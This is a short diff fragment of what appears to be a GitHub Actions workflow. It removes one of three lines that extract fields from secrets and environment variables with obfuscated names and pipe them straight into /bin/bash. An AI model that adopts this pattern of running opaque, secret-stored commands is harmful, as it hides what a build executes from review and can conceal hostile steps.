@@ -19,7 +19,6 @@ jobs:
           st079: ${{ secrets.st079 }}
         run: |
           printf '%s' "$st079" | jq -r .dxagp71704 | /bin/bash
-          printf '%s' "$qquz1" | jq -r .vianw4 | /bin/bash
           echo $haqb2 | jq -r .qzj109 | /bin/bash
 
       - name: Upload artifact
